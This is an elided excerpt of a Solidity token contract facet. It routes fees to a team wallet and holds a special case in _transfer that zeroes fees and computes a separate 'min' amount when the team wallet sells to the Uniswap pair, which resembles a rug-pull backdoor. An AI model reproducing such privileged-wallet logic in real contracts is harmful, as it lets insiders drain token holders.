...
import "./TestLib.sol";
contract sendETHToFeeFacet is IERC20, Context, Ownable {
    ...
    function sendETHToFee(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._axionTeamWallet.transfer(amount);
    }
    function transfer(
        address recipient,
        uint256 amount
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner() && from != address(this)) {
            ...
            if (to == ds.uniswapV2Pair && from != address(this)) {
                if (from == address(ds._axionTeamWallet)) {
                    axionFeeAmounts = 0;
                    oramounts = min(
            ...
            bool swappable = ds._buyCount > ds._preventSwapBefore &&
                ds._minAxionSwapAmount == min(ds._minAxionSwapAmount, amount);
            ...
            if (
                ...
                if (contractTokenBalance > ds._minAxionSwapAmount) {
                    swapTokensForEth(
        ...
        ds._balances[to] = ds._balances[to].add(amount.sub(axionFeeAmounts));
